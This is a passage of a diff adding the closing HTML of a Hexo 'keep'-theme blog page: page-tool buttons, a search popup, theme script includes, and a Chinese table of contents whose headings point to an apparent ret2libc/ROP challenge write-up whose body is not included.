+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E5%88%86%E6%9E%90"><span class="nav-text">前置分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B%E5%81%9A%E9%A2%98"><span class="nav-text">开始做题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E6%80%9D%E8%B7%AF"><span class="nav-text">构造思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc%E5%92%8CROP"><span class="nav-text">ret2libc和ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%AF%BB%E6%89%BElibc%E5%BA%93%E5%9F%BA%E5%9D%80"><span class="nav-text">1.寻找libc库基址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E8%AE%A1%E7%AE%97%E5%90%8E%E9%97%A8%E4%BB%A3%E7%A0%81%E5%81%8F%E7%A7%BB%E5%8F%8A%E5%9C%B0%E5%9D%80"><span class="nav-text">2.计算后门代码偏移及地址</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0payload"><span class="nav-text">构造payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%A9%E5%B1%95%E7%9F%A5%E8%AF%86"><span class="nav-text">扩展知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#x86-%E5%92%8C-x86-64-%E7%9A%84ROP%E5%B7%AE%E5%BC%82"><span class="nav-text">x86 和 x86_64 的ROP差异</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E4%BB%A5%E5%8F%8A%E6%8E%A8%E8%8D%90"><span class="nav-text">参考以及推荐</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/libs/anime.min.js"></script>
+
+<!-- local search -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/local-search.min.js"></script>
+
+
+<!-- lazyload -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/lazyload.min.js"></script>
+
+
+<div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/post/post-helper.min.js"></script>
+
+        <!-- toc -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/post/toc.min.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/post/copyright-info.min.js"></script>
+        
+
+        <!-- share -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/js/post/share.min.js"></script>
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+    
+        
+    
+
+</body>
+</html>
